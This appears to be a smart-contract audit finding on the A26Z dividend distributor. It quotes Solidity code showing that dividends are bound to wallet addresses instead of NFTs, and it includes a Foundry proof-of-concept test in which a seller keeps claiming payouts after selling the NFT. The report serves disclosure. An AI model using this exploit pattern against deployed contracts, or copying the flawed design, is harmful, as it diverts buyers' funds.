# [000209] Dividend shares are tied to wallet addresses, not NFTs, so sellers keep all future payouts after transferring their TVSs
  
  ### Summary

The dividend distributor snapshots the current owner addresses when `_setDividends` runs and stores the allocation in a mapping keyed by `address`. Later, `claimDividends` only checks `msg.sender` against that mapping and never verifies that the caller still owns any TVS. As a result, once dividends are configured, whoever held the NFT at that moment retains the right to claim the entire dividend stream forever, regardless of subsequent transfers. Buyers of TVSs receive zero dividends even though they now own the underlying allocation.

### Root Cause

In protocol/src/contracts/A26ZDividendDistributor/A26ZDividendDistributor.sol:214-223,186-204,- `_setDividends` allocates each TVS share directly to `dividendsOf[owner]` instead of tracking per NFT:

```214:224:protocol/src/contracts/A26ZDividendDistributor/A26ZDividendDistributor.sol
    function _setDividends() internal {
        uint256 len = nft.getTotalMinted();
        for (uint i; i < len;) {
            (address owner, bool isOwned) = safeOwnerOf(i);
            if (isOwned) dividendsOf[owner].amount += (unclaimedAmountsIn[i] * stablecoinAmountToDistribute / totalUnclaimedAmounts);
            unchecked {
                ++i;
            }
        }
        emit dividendsSet();
    }
```

- `claimDividends` pays anyone whose address appears in `dividendsOf`, without validating NFT ownership:

```186:205:protocol/src/contracts/A26ZDividendDistributor/A26ZDividendDistributor.sol
    function claimDividends() external {
        address user = msg.sender;
        uint256 totalAmount = dividendsOf[user].amount;
        uint256 claimedSeconds = dividendsOf[user].claimedSeconds;
        uint256 secondsPassed;
        if (block.timestamp >= vestingPeriod + startTime) {
            secondsPassed = vestingPeriod;
            dividendsOf[user].amount = 0;
            dividendsOf[user].claimedSeconds = 0;
        } else {
            secondsPassed = block.timestamp - startTime;
            dividendsOf[user].claimedSeconds += (secondsPassed - claimedSeconds);
        }
        uint256 claimableSeconds = secondsPassed - claimedSeconds;
        uint256 claimableAmount = totalAmount * claimableSeconds / vestingPeriod;
        stablecoin.safeTransfer(user, claimableAmount);
        emit dividendsClaimed(user, claimableAmount);
    }
```

There is no mechanism that updates `dividendsOf` when NFTs are transferred, and claim time does not verify the caller owns any TVS. Therefore dividends are account-bound, not NFT-bound.

### Internal Pre-conditions

1. Dividends have been configured via `setUpTheDividends` / `_setDividends`.
2. At least one TVS NFT exists and is transferable.
3. Stablecoin funds are available inside the distributor.

### External Pre-conditions

1. A buyer is willing to purchase a TVS NFT after dividends are configured (typical in secondary markets).

### Attack Path

1. Alice owns TVS NFT #1 and the distributor owner calls `setUpTheDividends`, which records `dividendsOf[Alice] = allocation`.
2. Alice transfers or sells NFT #1 to Bob (standard ERC721 transfer).
3. Bob expects to receive future dividends but `dividendsOf[Bob]` is zero because `_setDividends` never ran again.
4. Alice keeps calling `claimDividends()` even though she no longer owns any TVS. The function never checks NFT ownership, so she continues to receive the entire dividend stream.
5. Bob can never claim dividends for NFT #1; all stablecoin distributions are stolen by the previous holder.

### Impact

- Sellers can dump TVSs on unsuspecting buyers while retaining all future dividend flows.
- Buyers receive worthless NFTs from the perspective of dividends, destroying trust in the protocol and any secondary market.
- Protocol allocates the entire dividend pool to addresses that no longer own the corresponding positions, so funds are permanently misdirected.

### PoC

1. Alice mints a TVS through `claimNFT`.
2. Treasury funds the distributor and calls `setUpTheDividends`.
3. Alice transfers NFT #1 to Bob (e.g., `safeTransferFrom`).
4. Bob calls `claimDividends()` – `claimableAmount` is zero because `dividendsOf[Bob].amount == 0`.
5. Alice calls `claimDividends()` – she still receives the full payout even though she no longer owns NFT #1.
```solidity
// SPDX-License-Identifier: MIT
pragma solidity =0.8.29;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/utils/cryptography/MerkleProof.sol";
import {Aligners26} from "../src/contracts/token/Aligners26.sol";
import {AlignerzNFT} from "../src/contracts/nft/AlignerzNFT.sol";
import {MockUSD} from "../src/MockUSD.sol";
import {AlignerzVesting} from "../src/contracts/vesting/AlignerzVesting.sol";
import {A26ZDividendDistributor} from "../src/contracts/A26ZDividendDistributor/A26ZDividendDistributor.sol";
import {Upgrades} from "openzeppelin-foundry-upgrades/Upgrades.sol";
import {CompleteMerkle} from "murky/src/CompleteMerkle.sol";

/// @notice Test to prove the dividend rights bug: dividends are tied to addresses, not NFTs
/// @dev When an NFT is transferred after dividends are set, the seller keeps all dividend rights
///      while the buyer receives nothing, even though they now own the TVS
contract DividendRightsDoNotFollowNFTOwnershipBugTest is Test {
    AlignerzVesting public vesting;
    Aligners26 public token;
    AlignerzNFT public nft;
    MockUSD public usdt;
    A26ZDividendDistributor public dividendDistributor;

    address public owner;
    address public projectCreator;
    address public alice; // Original NFT owner
    address public bob;   // Buyer of NFT
    address public bidder2; // Second bidder (needed for merkle tree)

    // Constants
    uint256 constant TOKEN_AMOUNT = 26_000_000 ether;
    uint256 constant BIDDER_USD = 1_000 ether;
    uint256 constant DIVIDEND_AMOUNT = 10_000 ether; // 10k USDT for dividends
    uint256 constant PROJECT_ID = 0;

    // Project structure
    struct BidInfo {
        address bidder;
        uint256 amount;
        uint256 vestingPeriod;
        uint256 poolId;
        bool accepted;
    }

    // Track proofs
    mapping(address => bytes32[]) public bidderProofs;
    mapping(address => uint256) public bidderPoolIds;

    function setUp() public {
        owner = address(this);
        projectCreator = makeAddr("projectCreator");
        alice = makeAddr("alice");
        bob = makeAddr("bob");
        bidder2 = makeAddr("bidder2");
        
        vm.deal(projectCreator, 100 ether);
        vm.deal(alice, 50 ether);
        vm.deal(bob, 50 ether);
        vm.deal(bidder2, 50 ether);

        // Deploy contracts
        usdt = new MockUSD();
        token = new Aligners26("26Aligners", "A26Z");
        nft = new AlignerzNFT("AlignerzNFT", "AZNFT", "https://nft.alignerz.bid/");

        address payable proxy = payable(Upgrades.deployUUPSProxy(
            "AlignerzVesting.sol",
            abi.encodeCall(AlignerzVesting.initialize, (address(nft))))
        );
        vesting = AlignerzVesting(proxy);

        // Set NFT minter to vesting contract
        vm.prank(owner);
        nft.addMinter(proxy);
        vesting.setTreasury(address(1));

        // Setup bidders
        usdt.mint(alice, BIDDER_USD);
        usdt.mint(bidder2, BIDDER_USD);

        // Mint tokens for project creator
        token.transfer(projectCreator, TOKEN_AMOUNT);
        vesting.transferOwnership(projectCreator);

        // Approve tokens for vesting contract
        vm.prank(projectCreator);
        token.approve(address(vesting), TOKEN_AMOUNT);
    }

    // Helper function to create a leaf node for the merkle tree
    function getLeaf(address _bidder, uint256 amount, uint256 projectId, uint256 poolId)
        internal
        pure
        returns (bytes32)
    {
        return keccak256(abi.encodePacked(_bidder, amount, projectId, poolId));
    }

    // Helper for generating merkle proofs
    function generateMerkleProofs(BidInfo[] memory bids, uint256 poolId) internal returns (bytes32) {
        uint256 leafCount = 0;
        for (uint256 i = 0; i < bids.length; i++) {
            if (bids[i].poolId == poolId && bids[i].accepted) {
                leafCount++;
            }
        }

        require(leafCount >= 2, "Need at least 2 bids for Merkle tree");

        bytes32[] memory leaves = new bytes32[](leafCount);
        uint256 currentIndex = 0;

        for (uint256 i = 0; i < bids.length; i++) {
            if (bids[i].poolId == poolId && bids[i].accepted) {
                leaves[currentIndex] = getLeaf(bids[i].bidder, bids[i].amount, PROJECT_ID, poolId);
                bidderPoolIds[bids[i].bidder] = poolId;
                currentIndex++;
            }
        }

        CompleteMerkle m = new CompleteMerkle();
        bytes32 root = m.getRoot(leaves);
        uint256 indexTracker = 0;
        for (uint256 i = 0; i < bids.length; i++) {
            if (bids[i].poolId == poolId && bids[i].accepted) {
                bytes32[] memory proof = m.getProof(leaves, indexTracker);
                bidderProofs[bids[i].bidder] = proof;
                indexTracker++;
            }
        }

        return root;
    }

    /// @notice Test that demonstrates the bug: dividend rights don't follow NFT ownership
    /// @dev When Alice transfers her NFT to Bob after dividends are set:
    ///      1. Alice keeps all dividend rights (can claim dividends)
    ///      2. Bob receives nothing (dividendsOf[Bob] is 0)
    ///      3. This breaks the secondary market for TVS NFTs
    function test_DividendRights_DoNotFollowNFTOwnership() public {
        // Setup project and claim NFT
        vm.startPrank(projectCreator);
        vesting.setVestingPeriodDivisor(1);
        vesting.launchBiddingProject(
            address(token),
            address(usdt),
            block.timestamp,
            block.timestamp + 1_000_000,
            "0x0",
            true
        );
        vesting.createPool(PROJECT_ID, 3_000_000 ether, 0.01 ether, true);
        
        address[] memory whitelist = new address[](2);
        whitelist[0] = alice;
        whitelist[1] = bidder2;
        vesting.addUsersToWhitelist(whitelist, PROJECT_ID);
        vm.stopPrank();

        // Both bidders place bids
        vm.startPrank(alice);
        usdt.approve(address(vesting), BIDDER_USD);
        vesting.placeBid(PROJECT_ID, BIDDER_USD, 90 days);
        vm.stopPrank();

        vm.startPrank(bidder2);
        usdt.approve(address(vesting), BIDDER_USD);
        vesting.placeBid(PROJECT_ID, BIDDER_USD, 90 days);
        vm.stopPrank();

        // Generate merkle proofs and finalize
        BidInfo[] memory allBids = new BidInfo[](2);
        allBids[0] = BidInfo({
            bidder: alice,
            amount: BIDDER_USD,
            vestingPeriod: 90 days,
            poolId: 0,
            accepted: true
        });
        allBids[1] = BidInfo({
            bidder: bidder2,
            amount: BIDDER_USD,
            vestingPeriod: 90 days,
            poolId: 0,
            accepted: true
        });

        bytes32[] memory poolRoots = new bytes32[](1);
        poolRoots[0] = generateMerkleProofs(allBids, 0);

        vm.prank(projectCreator);
        vesting.finalizeBids(PROJECT_ID, bytes32(0), poolRoots, 60);

        // Alice claims her NFT
        vm.prank(alice);
        uint256 nftId = vesting.claimNFT(PROJECT_ID, 0, BIDDER_USD, bidderProofs[alice]);

        // Verify Alice owns the NFT
        assertEq(nft.ownerOf(nftId), alice, "Alice should own the NFT initially");

        // Deploy dividend distributor with DIFFERENT token to bypass token filter bug (H-06)
        // This allows us to test the dividend rights bug without hitting other bugs
        Aligners26 differentToken = new Aligners26("Different", "DIFF");
        dividendDistributor = new A26ZDividendDistributor(
            address(vesting),
            address(nft),
            address(usdt),
            block.timestamp,
            90 days,
            address(differentToken) // Different token to bypass token filter bug
        );

        // Fund the distributor with stablecoin for dividends
        usdt.mint(address(dividendDistributor), DIVIDEND_AMOUNT);

        // Set up dividends - this snapshots Alice's address as the dividend recipient
        // BUG: _setDividends records dividendsOf[alice] based on her ownership at this moment
        vm.prank(projectCreator);
        dividendDistributor.setUpTheDividends();

        // Verify Alice has dividend allocation
        // Note: We can't directly read dividendsOf, but we can verify through claim behavior

        // THE BUG: Alice transfers NFT to Bob
        // In a real scenario, this would be a sale on a secondary market
        vm.prank(alice);
        nft.safeTransferFrom(alice, bob, nftId);

        // Verify Bob now owns the NFT
        assertEq(nft.ownerOf(nftId), bob, "Bob should now own the NFT");

        // Fast forward time to allow dividend claiming
        vm.warp(block.timestamp + 30 days);

        // BUG DEMONSTRATION: Bob tries to claim dividends but gets nothing
        // dividendsOf[Bob] was never set because _setDividends only ran when Alice owned the NFT
        uint256 bobBalanceBefore = usdt.balanceOf(bob);
        vm.prank(bob);
        dividendDistributor.claimDividends();
        uint256 bobBalanceAfter = usdt.balanceOf(bob);
        
        // BUG: Bob receives nothing even though he owns the NFT
        assertEq(
            bobBalanceAfter - bobBalanceBefore,
            0,
            "BUG: Bob receives no dividends even though he owns the NFT"
        );

        // BUG DEMONSTRATION: Alice can still claim dividends even though she no longer owns the NFT
        // dividendsOf[Alice] was set when she owned the NFT, and claimDividends never checks ownership
        uint256 aliceBalanceBefore = usdt.balanceOf(alice);
        vm.prank(alice);
        dividendDistributor.claimDividends();
        uint256 aliceBalanceAfter = usdt.balanceOf(alice);
        
        // BUG: Alice receives dividends even though she sold the NFT
        assertGt(
            aliceBalanceAfter - aliceBalanceBefore,
            0,
            "BUG: Alice receives dividends even though she no longer owns the NFT"
        );

        // This proves the bug: dividend rights are permanently bound to the address
        // that owned the NFT when dividends were set, not to the current NFT owner
    }

    /// @notice Test that verifies dividends are set per address, not per NFT
    /// @dev This test directly demonstrates that _setDividends uses address-based mapping
    function test_Dividends_AreSetPerAddressNotPerNFT() public {
        // Setup project and claim NFT (same as above)
        vm.startPrank(projectCreator);
        vesting.setVestingPeriodDivisor(1);
        vesting.launchBiddingProject(
            address(token),
            address(usdt),
            block.timestamp,
            block.timestamp + 1_000_000,
            "0x0",
            true
        );
        vesting.createPool(PROJECT_ID, 3_000_000 ether, 0.01 ether, true);
        
        address[] memory whitelist = new address[](2);
        whitelist[0] = alice;
        whitelist[1] = bidder2;
        vesting.addUsersToWhitelist(whitelist, PROJECT_ID);
        vm.stopPrank();

        vm.startPrank(alice);
        usdt.approve(address(vesting), BIDDER_USD);
        vesting.placeBid(PROJECT_ID, BIDDER_USD, 90 days);
        vm.stopPrank();

        vm.startPrank(bidder2);
        usdt.approve(address(vesting), BIDDER_USD);
        vesting.placeBid(PROJECT_ID, BIDDER_USD, 90 days);
        vm.stopPrank();

        BidInfo[] memory allBids = new BidInfo[](2);
        allBids[0] = BidInfo({
            bidder: alice,
            amount: BIDDER_USD,
            vestingPeriod: 90 days,
            poolId: 0,
            accepted: true
        });
        allBids[1] = BidInfo({
            bidder: bidder2,
            amount: BIDDER_USD,
            vestingPeriod: 90 days,
            poolId: 0,
            accepted: true
        });

        bytes32[] memory poolRoots = new bytes32[](1);
        poolRoots[0] = generateMerkleProofs(allBids, 0);

        vm.prank(projectCreator);
        vesting.finalizeBids(PROJECT_ID, bytes32(0), poolRoots, 60);

        vm.prank(alice);
        uint256 nftId = vesting.claimNFT(PROJECT_ID, 0, BIDDER_USD, bidderProofs[alice]);

        // Deploy dividend distributor
        Aligners26 differentToken = new Aligners26("Different", "DIFF");
        dividendDistributor = new A26ZDividendDistributor(
            address(vesting),
            address(nft),
            address(usdt),
            block.timestamp,
            90 days,
            address(differentToken)
        );

        usdt.mint(address(dividendDistributor), DIVIDEND_AMOUNT);

        // Set up dividends while Alice owns the NFT
        vm.prank(projectCreator);
        dividendDistributor.setUpTheDividends();

        // Record Alice's expected dividend amount (we can infer from claim behavior)
        vm.warp(block.timestamp + 30 days);
        
        uint256 aliceBalanceBefore = usdt.balanceOf(alice);
        vm.prank(alice);
        dividendDistributor.claimDividends();
        uint256 aliceBalanceAfter = usdt.balanceOf(alice);
        uint256 aliceDividendAmount = aliceBalanceAfter - aliceBalanceBefore;
        
        assertGt(aliceDividendAmount, 0, "Alice should receive dividends while owning NFT");

        // Now transfer NFT to Bob
        vm.prank(alice);
        nft.safeTransferFrom(alice, bob, nftId);

        // Fast forward more time
        vm.warp(block.timestamp + 30 days);

        // Bob tries to claim - gets nothing
        uint256 bobBalanceBefore = usdt.balanceOf(bob);
        vm.prank(bob);
        dividendDistributor.claimDividends();
        uint256 bobBalanceAfter = usdt.balanceOf(bob);
        assertEq(bobBalanceAfter - bobBalanceBefore, 0, "Bob gets nothing");

        // Alice can still claim more dividends
        uint256 aliceBalanceBefore2 = usdt.balanceOf(alice);
        vm.prank(alice);
        dividendDistributor.claimDividends();
        uint256 aliceBalanceAfter2 = usdt.balanceOf(alice);
        
        // BUG: Alice receives more dividends even though she sold the NFT
        assertGt(
            aliceBalanceAfter2 - aliceBalanceBefore2,
            0,
            "BUG: Alice continues to receive dividends after selling NFT"
        );

        // This proves that dividends are permanently tied to Alice's address,
        // not to the NFT itself or its current owner
    }
}

```
### Mitigation

_No response_
  